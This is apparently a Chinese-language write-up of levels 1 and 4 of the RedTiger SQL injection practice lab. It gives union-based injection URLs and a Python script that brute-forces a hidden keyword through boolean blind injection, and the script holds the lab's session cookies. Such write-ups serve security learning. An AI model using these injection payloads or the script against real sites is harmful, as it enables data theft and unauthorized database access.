## Level 1

看到有个表单需要我们进行输入账号密码登录，登录成功后可以得到flag



查看是否有注入的点



点击页面上的 Category 得到 

![image-20210208112110744](https://fnoteimg.oss-cn-chengdu.aliyuncs.com/img/20210208112110.png)

从这里进行突破 进行盲注 拼接SQL

`level1.php?cat=1 and 1=2`

发现返回信息变了 说明这里存在注入点

![image-20210208112240251](https://fnoteimg.oss-cn-chengdu.aliyuncs.com/img/20210208112240.png)



1. 通过` order by` 得到字段个数为 4 个

`cat =1 order by 4`

2. 使用 union 进行联合查询，得到结果 3,4

![image-20210208112506268](https://fnoteimg.oss-cn-chengdu.aliyuncs.com/img/20210208112506.png)

3. 直接查询出  username和password

   ![image-20210208112801990](https://fnoteimg.oss-cn-chengdu.aliyuncs.com/img/20210208112802.png)

4. 登录 得到flag

## Level 4

这道题根据传入的参数不同，发现页面上只会显示0和1

`https://redtiger.labs.overthewire.org/level4.php?id=1 and 1=2` 显示0

`https://redtiger.labs.overthewire.org/level4.php?id=1 and 1=1` 显示1

由此可见，这道题应该用布尔盲注

思路：构造一个逻辑语句，来找到`keyword` 列的内容长度，然后用脚本跑出 `a-z` `A-Z` `0-9` 的结果

1. 首先猜查询的字段个数 

   `https://redtiger.labs.overthewire.org/level4.php?id=1 order by 2` 

   字段个数为2 

2. 猜内容长度

   `https://redtiger.labs.overthewire.org/level4.php?id=1 union select keyword,2 from level4_secret where length(keyword)=21`

   通过脚本跑出来 长度为21

3. 利用python脚本爆破答案

   跑得很慢，但是能跑出来 

   `killstickswithbr1cks!`

   ```python
   import requests
   import re
   import time
   
   url = 'https://redtiger.labs.overthewire.org/level4.php?{}'
   headers = {
       # 'referer': 'https://www.acfun.cn/',
       'Connection': 'close',
       'sec-ch-ua': '"Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"',
       'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
       'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
       'Cookie': 'level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head',
       'Hosts': 'redtiger.labs.overthewire.org'
   }
   session = requests.session()
   session.headers = headers
   session.keep_alive = False 防止多个连接，导致异常
   count = 1
   result = ''
   # 每个位置依次比较
   start = time.time()
   for i in range(1, 22):
       for s in range(1, 128):
           param = '1 union select keyword,2 from level4_secret where ascii(substr(keyword,{},1))={}'.format(i, s)
           r = session.get(url=url.format('id=' + param))
           # print(r.url)
           # 获取结果条数
           pattern = re.compile('.*Query.*returned.*(\\d).*', re.S)
           res = re.findall(pattern, r.text)[0]
           print('i=', i, '  res=', res, ' count=', count)
           if str(res) == '2':
               result += chr(s)
               break
           count += 1
   end = time.time()
   print('result=', result)
   print('总共耗时:{}s'.format(end - start))
   
   ```



4. 坑，跑出来才发现比较的时候忽略了大小写，所以全是大写的字母，由于跑得太慢，所以将大写字母的答案重新跑一边得到真实答案

   